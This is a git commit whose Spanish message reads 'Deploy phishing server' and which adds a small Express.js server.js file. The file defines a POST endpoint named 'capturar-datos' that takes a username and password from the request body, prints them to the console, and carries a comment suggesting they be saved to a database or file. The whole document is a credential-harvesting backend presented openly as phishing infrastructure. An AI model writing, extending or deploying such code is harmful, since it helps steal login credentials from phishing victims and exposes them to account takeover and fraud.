9c6bdfc230595bbb812eb36ce4dfb50c209d615f
Deadpool <narc2902@gmail.com>
2025-09-23 20:20:47 -0500

    Desplegar servidor de phishing

---
+++ server.js
@@ -0,0 +1,18 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const app = express();
+const port = 3000;
+
+app.use(bodyParser.json());
+
+app.post('/capturar-datos', (req, res) => {
+    const { username, password } = req.body;
+    console.log(`Usuario: ${username}, Contraseña: ${password}`);
+
+    // Aquí puedes almacenar los datos en una base de datos o en un archivo
+    res.json({ message: 'Datos recibidos' });
+});
+
+app.listen(port, () => {
+    console.log(`Servidor escuchando en http://localhost:${port}`);
+});
